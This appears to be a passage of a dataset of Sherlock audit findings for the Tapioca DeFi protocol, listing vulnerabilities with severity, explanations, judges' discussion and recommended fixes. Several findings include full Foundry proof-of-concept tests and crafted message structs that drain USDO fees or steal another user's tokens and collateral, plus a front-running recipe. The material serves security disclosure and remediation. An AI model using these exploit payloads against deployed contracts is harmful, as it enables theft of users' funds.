OFTMsgCodec.bytes32ToAddress(remoteTransferMsg_.lzSendParam.sendParam.to),\n            remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );\n    }\n```\n\nDiscussion\nsherlock-admin3\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nseem valid; high(6)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/tapioca-periph/pull/200.чHigh. An attacker can drain any USDO holder’s balance and transfer it to themselves.\nCode Snippet\nTool used\nManual Review, foundry
Recursive _lzCompose() call can be leveraged to steal all generated USDO feesчhighч```\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n```\nч"It is possible to steal all generated USDO fees by leveraging the recursive _lzCompose() call triggered in compose calls.\nThe `USDOFlashloanHelper` contract allows users to take USDO flash loans. When a user takes a flash loan some fees will be enforced and transferred to the USDO contract:\nSuch fees can be later retrieved by the owner of the USDO contract via the `extractFees()` function:\nHowever, such fees can be stolen by an attacker by leveraging a wrong parameter set when performing a compose call.\nWhen a compose call is triggered, the internal `_lzCompose()` call will be triggered. This call will check the `msgType_` and execute some logic according to the type of message requested. After executing the corresponding logic, it will be checked if there is an additional message by checking the `nextMsg_.length`. If the compose call had a next message to be called, a recursive call will be triggered and `_lzCompose()` will be called again:\nAs we can see in the code snippet’s last line, if `nextMsg_.length > 0` an additional compose call can be triggered . The problem with this call is that the first parameter in the `_lzCompose()` call is hardcoded to be `address(this)` (address of USDO), making the `srcChainSender_` become the USDO address in the recursive compose call.\nAn attacker can then leverage the remote transfer logic in order to steal all the USDO tokens held in the USDO contract (mainly fees generated by flash loans).\nForcing the recursive call to be a remote transfer, `_remoteTransferReceiver()` will be called. Because the source chain sender in the recursive call is the USDO contract, the `owner` parameter in the remote transfer (the address from which the remote transfer tokens are burnt) can also be set to the USDO address, making the allowance check in the `_internalTransferWithAllowance()` call be bypassed, and effectively burning a desired amount from USDO.\nAfter burning the tokens from USDO, the remote transfer will trigger a call to a destination chain to mint the burnt tokens in the origin chain. The receiver of the tokens can be different from the address whose tokens were burnt, so an attacker can obtain the minted tokens in the destination chain, effectively stealing all USDO balance from the USDO contract.\nAn example attack path would be:\nAn attacker creates a compose call from chain A to chain B. This compose call is actually composed of two messages:\nThe first message, which won’t affect the attack and is simply the initial step to trigger the attack in the destination chain\nThe second message (nextMsg), which is the actual compose message that will trigger the remote transfer and burn the tokens in chain B, and finally trigger a call back to chain A to mint he tokens\nThe call is executed, chain B receives the call and triggers the first compose message (as demonstrated in the PoC, this first message is not important and can simply be a remote transfer call with a 0 amount of tokens). After triggering the first compose call, the second compose message is triggered. The USDO contract is set as the source chain sender and the remote transfer is called. Because the owner set in the compose call and the source chain sender are the same, the specified tokens in the remote transfer are directly burnt\nFinally, the compose call triggers a call back to chain A to mint the burnt tokens in chain B, and tokens are minted to the attacker\n\nThe following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:\n```\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n```\n\n```\nfunction testVuln_USDOBorrowFeesCanBeDrained() public {\n\n        // Change configured enpoints\n\n        endpoints[aEid] = address(mockEndpointV2A);\n        endpoints[bEid] = address(mockEndpointV2B);\n\n        aUsdo.setEndpoint(address(mockEndpointV2A));\n        bUsdo.setEndpoint(address(mockEndpointV2B));\n\n        \n        // Mock generated fees\n        deal(address(bUsdo), address(bUsdo), 100 ether);\n\n        ////////////////////////////////////////////////////////\n        //                 PREPARE MESSAGES                   //\n        ////////////////////////////////////////////////////////\n\n        // NEXT MESSAGE    B --> A      (EXECUTED AS THE nextMsg after the INITIAL  B --> A MESSAGE)            \n\n        SendParam memory sendParamAToBVictim = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n            minAmountLD: 100 ether,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeAToBVictim = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n            sendParam: sendParamAToBVictim,\n            fee: feeAToBVictim,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n            owner: address(bUsdo), // IMPORTANT: This will make the attack be triggered as bUsdo will become the srcChainSender in the nextMsg compose call\n            composeMsg: bytes(""""),\n            lzSendParam: lzSendParamAToBVictim\n        });\n\n        uint16 index; // needed to bypass Solidity's encoding literal error\n        // Create Toe Compose message for the victim\n        bytes memory toeComposeMsgVictim = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n            index, // index\n            abi.encode(remoteTransferMsgVictim), // message\n            bytes("""") // next message\n        );\n \n        // SECOND MESSAGE (composed)     B ---> A      \n        // This second message is a necessary step in order to reach the execution\n        // inside `_lzCompose()` where the nextMsg can be triggered\n\n        SendParam memory sendParamBToA = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(address(aUsdo)),\n            amountLD: 0, \n            minAmountLD: 0,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeBToA = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamBToA = LZSendParam({\n            sendParam: sendParamBToA,\n            fee: feeBToA,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        // Create remote transfer message\n        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({\n            owner: makeAddr(""attacker""),\n            composeMsg: bytes(""""),\n            lzSendParam: lzSendParamBToA\n        });\n\n        // Create Toe Compose message\n        bytes memory toeComposeMsg = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsg).length), // message length\n            index, // index\n            abi.encode(remoteTransferMsg),\n            toeComposeMsgVictim // next message: IMPORTANT to set this to the A --> B message that will be triggered as the `nextMsg`\n        );\n         \n        // INITIAL MESSAGE       A ---> B                      \n\n        // Create `_lzSendParam` parameter for `sendPacket()`\n        SendParam memory sendParamAToB = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")), // address here doesn't matter\n            amountLD: 0,\n            minAmountLD: 0,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeAToB = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToB = LZSendParam({\n            sendParam: sendParamAToB,\n            fee: feeAToB,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        vm.startPrank(makeAddr(""attacker""));\n        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);\n\n        // EXECUTE ATTACK\n\n        // Execute first lzReceive() --> receive message in chain B\n    \n        vm.startPrank(endpoints[bEid]);\n        UsdoReceiver(address(bUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)\n                OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")), // initially, the sender for the first A --> B message is the attacker\n                toeComposeMsg\n            ), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // bUsdo will be burnt from the bUSDO address, and nextMsg will be triggered to mint the burnt amount in chain A, having \n        // the attacker as the receiver\n        UsdoReceiver(address(bUsdo)).lzCompose(\n            address(bUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        vm.startPrank(endpoints[aEid]);\n\n        // Receive nextMsg in chain A, mint tokens to the attacker\n        uint64 tokenAmountSD = usdoHelper.toSD(100 ether, aUsdo.decimalConversionRate());\n\n        UsdoReceiver(address(aUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n                tokenAmountSD\n            ), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n        \n\n        // Finished: bUSDO fees get drained, attacker obtains all the fees in the form of aUSDO\n        assertEq(bUsdo.balanceOf(address(bUsdo)), 0);\n        assertEq(aUsdo.balanceOf(makeAddr(""attacker"")), 100 ether);\n          \n    }\n```\n\nRun the poc with the following command: `forge test --mt testVuln_USDOBorrowFeesCanBeDrained`\nThe proof of concept shows how in the end, USDO’s `bUsdo` balance will become 0, while the same amount ofaUsdo in chain A will be minted to the attacker."чEnsure that the `_lzCompose()` call triggered when a `_nextMsg` exists keeps a consistent source chain sender address, instead of hardcoding it to `address(this)` :\nDiscussion\n0xRektora\nDupe of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111\n0xadrii\nEscalate I believe this issue has been wrongly marked as a duplicate of #111 .\nThe vulnerability detailed in this issue is not related to the issue of passing a wrong parameter as the source chain sender when the `_internalRemoteTransferSendPacket()` function is called. The overall root cause for the vulnerability described in #111 is actually different from the issue described in this report.\nThe problem with the vulnerability reported in this issue is that `address(this)` is hardcoded as the source chain sender for the next compose call if the length of the next message appended is > 0:\nThis will make the next compose call have `address(this)` (the USDO contract address) as the source chain sender for the next call. As seen in this issue comment, the fix proposed for #111 changes the source chain sender from `remoteTransferMsg_.owner` to `_srcChainSender`.\nAlthough this fix mitigates the possibility of draining any account that is passed as the `remoteTransferMsg_.owner` parameter (which is the root cause that allows #111 and all its duplicates to take place), the issue described in this report is still possible because the USDO contract will be passed as the `srcChainSender` in the compose call, which enables malicious actors to execute remote transfers as if they were USDO.\nAs shown in my PoC, an attacker can then burn all USDO fees held in the USDO contract on chain B, and transfer them to an arbitrary address in chain A, effectively stealing all fees sitting in the USDO contract.\nsherlock-admin2\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nnevillehuang\nThis seems like a duplicate of #135, will need to review further. They are all very similar to each other.\ncvetanovv\nI agree with the escalations and @nevillehuang comment. We can deduplicate from #111 and duplicate with #135.\ncvetanovv\nPlanning to accept the escalation and remove the duplication with #111, but duplicate with #135.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\n0xadrii: acceptedчHigh, all fees generated by the USDO contract can be effectively stolen by the attacker\nCode Snippet\nTool used\nManual Review, foundry
Unprotected `executeModule` function allows to steal the tokensчhighч```\nbUsdo.executeModule(\n    IUsdo.Module.UsdoMarketReceiver, \n    abi.encodeWithSelector(\n        UsdoMarketReceiverModule.removeAssetReceiver.selector, \n        marketMsg_), \n    false);\n```\nч"The `executeModule` function allows anyone to execute any module with any params. That allows attacker to execute operations on behalf of other users.\nHere is the `executeModule` function:\nAll its parameters are controlled by the caller and anyone can be the caller. Anyone can execute any module on behalf of any user.\nLet's try to steal someone's tokens using `UsdoMarketReceiver` module and `removeAssetReceiver` function (below is the PoC).\nHere is the code that will call the `executeModule` function:\n```\nbUsdo.executeModule(\n    IUsdo.Module.UsdoMarketReceiver, \n    abi.encodeWithSelector(\n        UsdoMarketReceiverModule.removeAssetReceiver.selector, \n        marketMsg_), \n    false);\n```\n\nThe important value here is the `marketMsg_` parameter. The `removeAssetReceiver` function forwards the call to `exitPositionAndRemoveCollateral` function via magnetar contract.\nThe `exitPositionAndRemoveCollateral` function removes asset from Singularity market if the `data.removeAndRepayData.removeAssetFromSGL` is `true`. The amount is taken from `data.removeAndRepayData.removeAmount`. Then, if `data.removeAndRepayData.assetWithdrawData.withdraw` is `true`, the `_withdrawToChain` is called.\nIn `_withdrawToChain`, if the `data.lzSendParams.sendParam.dstEid` is zero, the `_withdrawHere` is called that transfers asset to `data.lzSendParams.sendParam.to`.\nSumming up, the following `marketMsg_` struct can be used to steal userB's assets from singularity market by `userA`.\n```\nMarketRemoveAssetMsg({\n    user: address(userB),//victim\n    externalData: ICommonExternalContracts({\n        magnetar: address(magnetar),\n        singularity: address(singularity),\n        bigBang: address(0),\n        marketHelper: address(marketHelper)\n    }),\n    removeAndRepayData: IRemoveAndRepay({\n        removeAssetFromSGL: true,//remove from Singularity market\n        removeAmount: tokenAmountSD,//amount to remove\n        repayAssetOnBB: false,\n        repayAmount: 0,\n        removeCollateralFromBB: false,\n        collateralAmount: 0,\n        exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),\n        unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),\n        assetWithdrawData: MagnetarWithdrawData({\n            withdraw: true,//withdraw assets\n            yieldBox: address(yieldBox), //where from to withdraw\n            assetId: bUsdoYieldBoxId, //what asset to withdraw\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                extraOptions: ""0x"",\n                sendParam: SendParam({\n                    amountLD: 0,\n                    composeMsg: ""0x"",\n                    dstEid: 0,\n                    extraOptions: ""0x"",\n                    minAmountLD: 0,\n                    oftCmd: ""0x"",\n                    to: OFTMsgCodec.addressToBytes32(address(userA)) // recipient of the assets\n                })\n            }),\n            sendGas: 0,\n            composeGas: 0,\n            sendVal: 0,\n            composeVal: 0,\n            composeMsg: ""0x"",\n            composeMsgType: 0\n        }),\n        collateralWithdrawData: MagnetarWithdrawData({\n            withdraw: false,\n            yieldBox: address(0),\n            assetId: 0,\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                extraOptions: ""0x"",\n                sendParam: SendParam({\n                    amountLD: 0,\n                    composeMsg: ""0x"",\n                    dstEid: 0,\n                    extraOptions: ""0x"",\n                    minAmountLD: 0,\n                    oftCmd: ""0x"",\n                    to: OFTMsgCodec.addressToBytes32(address(userB))\n                })\n            }),\n            sendGas: 0,\n            composeGas: 0,\n            sendVal: 0,\n            composeVal: 0,\n            composeMsg: ""0x"",\n            composeMsgType: 0\n        })\n    })\n});\n```\n\nHere is the modified version of the `test_market_remove_asset` test that achieves the same result, but with unauthorized call to `executeModule` function. The `userA` is the attacker, and `userB` is the victim.\n```\n    function test_malicious_market_remove_asset() public {\n        uint256 erc20Amount_ = 1 ether;\n\n        // setup\n        {\n            deal(address(bUsdo), address(userB), erc20Amount_);\n\n            vm.startPrank(userB);\n            bUsdo.approve(address(yieldBox), type(uint256).max);\n            yieldBox.depositAsset(bUsdoYieldBoxId, address(userB), address(userB), erc20Amount_, 0);\n\n            uint256 sh = yieldBox.toShare(bUsdoYieldBoxId, erc20Amount_, false);\n            yieldBox.setApprovalForAll(address(pearlmit), true);\n            pearlmit.approve(\n                address(yieldBox), bUsdoYieldBoxId, address(singularity), uint200(sh), uint48(block.timestamp + 1)\n            );\n            singularity.addAsset(address(userB), address(userB), false, sh);\n            vm.stopPrank();\n        }\n\n        uint256 tokenAmount_ = 0.5 ether;\n\n        /**\n         * Actions\n         */\n        uint256 tokenAmountSD = usdoHelper.toSD(tokenAmount_, aUsdo.decimalConversionRate());\n\n        //approve magnetar\n        vm.startPrank(userB);\n        bUsdo.approve(address(magnetar), type(uint256).max);\n        singularity.approve(address(magnetar), type(uint256).max);\n        vm.stopPrank();\n        \n        MarketRemoveAssetMsg memory marketMsg = MarketRemoveAssetMsg({\n            user: address(userB),\n            externalData: ICommonExternalContracts({\n                magnetar: address(magnetar),\n                singularity: address(singularity),\n                bigBang: address(0),\n                marketHelper: address(marketHelper)\n            }),\n            removeAndRepayData: IRemoveAndRepay({\n                removeAssetFromSGL: true,\n                removeAmount: tokenAmountSD,\n                repayAssetOnBB: false,\n                repayAmount: 0,\n                removeCollateralFromBB: false,\n                collateralAmount: 0,\n                exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),\n                unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),\n                assetWithdrawData: MagnetarWithdrawData({\n                    withdraw: true,\n                    yieldBox: address(yieldBox),\n                    assetId: bUsdoYieldBoxId,\n                    unwrap: false,\n                    lzSendParams: LZSendParam({\n                        refundAddress: address(userB),\n                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                        extraOptions: ""0x"",\n                        sendParam: SendParam({\n                            amountLD: 0,\n                            composeMsg: ""0x"",\n                            dstEid: 0,\n                            extraOptions: ""0x"",\n                            minAmountLD: 0,\n                            oftCmd: ""0x"",\n                            to: OFTMsgCodec.addressToBytes32(address(userA)) // transfer to attacker\n                        })\n                    }),\n                    sendGas: 0,\n                    composeGas: 0,\n                    sendVal: 0,\n                    composeVal: 0,\n                    composeMsg: ""0x"",\n                    composeMsgType: 0\n                }),\n                collateralWithdrawData: MagnetarWithdrawData({\n                    withdraw: false,\n                    yieldBox: address(0),\n                    assetId: 0,\n                    unwrap: false,\n                    lzSendParams: LZSendParam({\n                        refundAddress: address(userB),\n                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                        extraOptions: ""0x"",\n                        sendParam: SendParam({\n                            amountLD: 0,\n                            composeMsg: ""0x"",\n                            dstEid: 0,\n                            extraOptions: ""0x"",\n                            minAmountLD: 0,\n                            oftCmd: ""0x"",\n                            to: OFTMsgCodec.addressToBytes32(address(userB))\n                        })\n                    }),\n                    sendGas: 0,\n                    composeGas: 0,\n                    sendVal: 0,\n                    composeVal: 0,\n                    composeMsg: ""0x"",\n                    composeMsgType: 0\n                })\n            })\n        });\n        bytes memory marketMsg_ = usdoHelper.buildMarketRemoveAssetMsg(marketMsg);\n\n\n        // I added _checkSender in MagnetarMock (function exitPositionAndRemoveCollateral) so need to whitelist USDO\n        cluster.updateContract(aEid, address(bUsdo), true);\n\n        // ----- ADDED THIS ------>\n        // Attack using executeModule\n        // ------------------------\n        vm.startPrank(userA);\n        bUsdo.executeModule(\n            IUsdo.Module.UsdoMarketReceiver, \n            abi.encodeWithSelector(\n                UsdoMarketReceiverModule.removeAssetReceiver.selector, \n                marketMsg_), \n            false);\n        // ------------------------\n\n        // Check execution\n        {\n            assertEq(bUsdo.balanceOf(address(userB)), 0);\n            assertEq(\n                yieldBox.toAmount(bUsdoYieldBoxId, yieldBox.balanceOf(address(userB), bUsdoYieldBoxId), false),\n                0\n            );\n            assertEq(bUsdo.balanceOf(address(userA)), tokenAmount_);\n        }\n    }\n```\n\nNote: The `burst` function was modified in the MagnetarMock contract and add call to `_checkSender` function to reproduce the real situation.\nThat is also why the `bUsdo` has been whitelisted in the test."ч
Pending allowances can be exploitedчhighч```\nfunction approveBorrow(address spender, uint256 amount) external returns (bool) {\n        _approveBorrow(msg.sender, spender, amount);\n        return true;\n    }\n```\nчPending allowances can be exploited in multiple places in the codebase.\n`TOFT::marketRemoveCollateralReceiver` has the following flow:\nIt calls `removeCollateral` ona a market with the following parameters: `from = msg_user`, `to = msg_.removeParams.magnetar`.\nInside the `SGLCollateral::removeCollateral` `_allowedBorrow` is called and check if the `from = msg_user` address has given enough `allowanceBorrow` to the `msg.sender` which in this case is the TOFT contract.\nSo for a user to use this flow in needs to call:\n```\nfunction approveBorrow(address spender, uint256 amount) external returns (bool) {\n        _approveBorrow(msg.sender, spender, amount);\n        return true;\n    }\n```\n\nAnd give the needed allowance to the TOFT contract.\nThis results in collateral being removed and transferred into the Magnetar contract with `yieldBox.transfer(address(this), to, collateralId, share);`.\nThe Magnetar gets the collateral, and it can withdraw it to any address specified in the `msg_.withdrawParams`.\nThis is problematic as the `TOFT::marketRemoveCollateralReceiver` doesn't check the `msg.sender`. In practice this means if Alice has called `approveBorrow` and gives the needed allowance with the intention of using the `marketRemoveCollateralReceiver` flow, Bob can use the `marketRemoveCollateralReceiver` flow and withdraw all the collateral from Alice to his address.\nSo, any pending allowances from any user can immediately be exploited to steal the collateral.\nOther occurrences\nThere are a few other occurrences of this problematic pattern in the codebase.\n`TOFT::marketBorrowReceiver` expects the user to give an approval to the Magnetar contract. The approval is expected inside the `_extractTokens` function where `pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);` is called. Again, the `msg.sender` is not checked inside the `marketBorrowReceiver` function, so this flow can be abused by another user to borrow and withdraw the borrowed amount to his address.\n`TOFT::mintLendXChainSGLXChainLockAndParticipateReceiver` also allows to borrow inside the BigBang market and withdraw the borrowed amount to an arbitrary address.\n`TOF::exerciseOptionsReceiver` has the `_internalTransferWithAllowance` function that simply allows to transfer TOFT tokens from any `_options.from` address that has given an allowance to `srcChainSender`, by anyone that calls this function. It allows to forcefully call the `exerciseOptionsReceiver` on behalf of any other user.\n`USDO::depositLendAndSendForLockingReceiver` also expects the user to give an allowance to the Magnetar contract, i.e. `MagnetarAssetXChainModule::depositYBLendSGLLockXchainTOLP` calls the `_extractTokens`.чThere are multiple instances of issues with dangling allowances in the protocol. Review all the allowance flows and make sure it can't be exploited.\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nseem invalid to me as the approval is made withing the function call which means user doesn't have to call the said approve function\nnevillehuang\nrequest poc\nsherlock-admin3\nPoC requested from @windhustler\nRequests remaining: 2\nwindhustler\nLet's imagine Alice has some collateral inside the Singularity Market on Avalanche.\nShe wants to remove that collateral and initiates a transaction from Ethereum.\nHer transaction on Avalanche will call `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` where `Market::removeCollateral` through IMarket(msg_.removeParams.market).execute(modules, calls, true);is called.\nRemove collateral is called with `msg.sender = TOFT`, `from = Alice`, `to = Magnetar`, and share = 10;\nAnd then Magnetar withdraws the collateral on another chain to Alice's address or any other address that is set in `MagnetarWithdrawData.LzSendParams.SendParam.to`, i.e. this can be any address.\nSo prerequisite for this flow to work is that Alice has:\na) Given allowance to the TOFT contract through the Pearlmit contract. b) Given the allowance to the TOFT contract through the `allowanceBorrow` function.\nIn other words, Alice needs to call in a separate transaction:\n```\nSingularity.approveBorrow(TOFT, 10)\n```\n\nand\n```\nPermiC.approve(address(yieldBox), collateralId, address(TOFT), 10, block.timestamp + 1 hour);\n```\n\nBut if Alice has ever given the two allowances listed above, Bob can front-run Alice's `TOFTMarketReceiverModule::marketRemoveCollateralReceiver` transaction and just call it with the following params:\n`from = Alice`\n`MagnetarWithdrawData.LzSendParams.SendParam.to = Bob`\nAs a consequence, Bob will steal Alice's collateral.\nThis is possible due to two reasons:\nThis `approve` is useless here. In the normal cross-chain call the `msg.sender` is the lzEndpoint so the `approve` does nothing. As I have described approvals should be given separately.\n`marketRemoveCollateralReceiver` is coded in a way that `msg.sender` is irrelevant which ties to the point above.\nTo give an analogy, this is almost as Alice giving allowance to UniswapV3 to use her tokens and then Bob can just exploit this allowance to drain Alice's funds. It would make sense if Alice has given the allowance to Bob for using her funds, but this is not the case here.\nLet me know if this makes sense or if you need further clarification.\nnevillehuang\n@windhustler This seems to be a duplicate of #31\nwindhustler\n#31 Makes the claim if Alice gives the allowance to Bob, he can abuse it under certain conditions. And it specifies a single instance related to `buyCollateral` flow.\nMy issue makes the claim that if Alice gives allowance to TOFT to execute a simple cross-chain flow, i.e.TOFT::marketRemoveCollateralReceiver, Bob can come along and steal all the collateral from Alice. It's quite different as Alice hasn't given any allowance to Bob at all. It makes the impact and mitigation different.\nMy issue also states several other occurrences that are similar in nature.\nnevillehuang\n@cryptotechmaker What do you think? I think this could be the primary issue and #31 and duplicates could be duplicated. Would the mitigation be different between these issues?\ncryptotechmaker\n@nevillehuang wouldn't this one and #19 be more or less duplicates?\nThese are the PRs I did for 19, which might solve it as well\nhttps://github.com/Tapioca-DAO/Tapioca-bar/pull/348\nhttps://github.com/Tapioca-DAO/TapiocaZ/pull/172\ncryptotechmaker\nIssue #137 is similar as well with the difference that 137 mentioned about some missing approvals. However it's still related to the allowance system\nnevillehuang\n@cryptotechmaker Here are the issues related to allowances that seems very similar:\n#19 #31 #137 #140\nFinding it hard to decide on duplication, will update again. Are the fixes similar in these issues?\ncryptotechmaker\n@nevillehuang I would add https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/134 on that list as well\ncryptotechmaker\nWe'll analyze them this week but yes, I think those are duplicates\nnevillehuang\n@cryptotechmaker I believe\n#19 to be a duplicate of #134 #31 to be a duplicate of #140 #137 Separate issue\nHollaDieWaldfee100\nEscalate\nThe report explains how in a regular cross-chain flow where TOFT::marketRemoveCollateralReceiver gets called it is expected of the user to give the allowance to the TOFT contract. Setting allowances is a precondition for this flow to be possible, not some extra requirement.  Then it describes how this can be abused by an attacker to steal all the user’s tokens. There are other issues that describe how user loss occurs while another cross-chain flow is being used in a “valid use case scenario”: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/130 Based on the arguments above there is no special precondition here so this should be a valid high.\nsherlock-admin2\nEscalate\nThe report explains how in a regular cross-chain flow where TOFT::marketRemoveCollateralReceiver gets called it is expected of the user to give the allowance to the TOFT contract. Setting allowances is a precondition for this flow to be possible, not some extra requirement.  Then it describes how this can be abused by an attacker to steal all the user’s tokens. There are other issues that describe how user loss occurs while another cross-chain flow is being used in a “valid use case scenario”: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/130 Based on the arguments above there is no special precondition here so this should be a valid high.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ncvetanovv\nWatson has demonstrated very well how a malicious user can front-run an honest user and steal his allowance, and in this way, he can steal his collateral.\nSo I plan to accept the escalation and make this issue High.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nHollaDieWaldfee100: accepted\n0xRektora\nAs a reference: #109 fixes this and any related dangling allowanceчThe impact of this vulnerability is that any pending allowances from any user can immediately be exploited to steal the collateral/borrowed amount.\nCode Snippet\nTool used\nManual Review
Incorrect `tapOft` Amounts Will Be Sent to Desired Chains on Certain Conditionsчmediumч```\n           uint256 amountToSend = _send.amountLD > _options.tapAmount ? _options.tapAmount : _send.amountLD;\n                if (_send.minAmountLD > amountToSend) {\n                    _send.minAmountLD = amountToSend;\n                }\n```\nчTOFTOptionsReceiverModule::exerciseOptionsReceiver module, is responsible for facilitating users' token exercises between `mTOFT` and `tapOFT` tokens across different chains. In a `msg-type` where the user wishes to receive the `tapOFT` tokens on a different chain, the module attempts to ensure the amount sent to the user on the desired chain, aligns with the received tap amount in the current chain. However, a flaw exists where the computed amount to send is not updated in the send parameters, resulting in incorrect token transfer.\nTOFTOptionsReceiverModule::exerciseOptionsReceiver module is a module that enables users to exercise their `mTOFT` tokens for a given amount of `tapOFT` option tokens.\nWhen the user wishes to withdraw these `tapOft` tokens on a different chain, the withdrawOnOtherChain param will be set to true. For this composed call type, the contract attempts to ensure the amount to send to the user on the other chain isn't more than the received `tap amount`, by doing this:\n```\n           uint256 amountToSend = _send.amountLD > _options.tapAmount ? _options.tapAmount : _send.amountLD;\n                if 